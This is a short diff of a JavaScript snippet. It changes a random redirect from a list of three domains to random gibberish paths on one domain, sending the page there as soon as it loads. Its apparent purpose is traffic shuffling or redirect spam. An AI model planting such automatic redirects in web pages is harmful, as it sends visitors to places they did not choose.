@@ -1,11 +1,24 @@
-// URL list
-const urls = [
-    "https://alcashzone.com",
-    "https://alcashedu.com",
-    "https://fastdevox.com",
-    // Add more URLs here
+
+
+
+// Base URL
+const baseUrl = "https://alcashzone.com/";
+
+// Permalink list
+const permalinks = [
+    "sdfsdjkf",
+    "sdfgdsgsd",
+    "sdgdsgdsgds",
+    "sdfgdsgdsg",
+    "sdgdsgdsgs",
+    "dsgdsgdsg"
 ];
 
-// Random URL selection and redirection
-const randomURL = urls[Math.floor(Math.random() * urls.length)];
-window.location.href = randomURL;
+// Random permalink selection
+const randomPermalink = permalinks[Math.floor(Math.random() * permalinks.length)];
+
+// Complete URL
+const redirectUrl = `${baseUrl}${randomPermalink}`;
+
+// Redirect to the new URL
+window.location.href = redirectUrl;
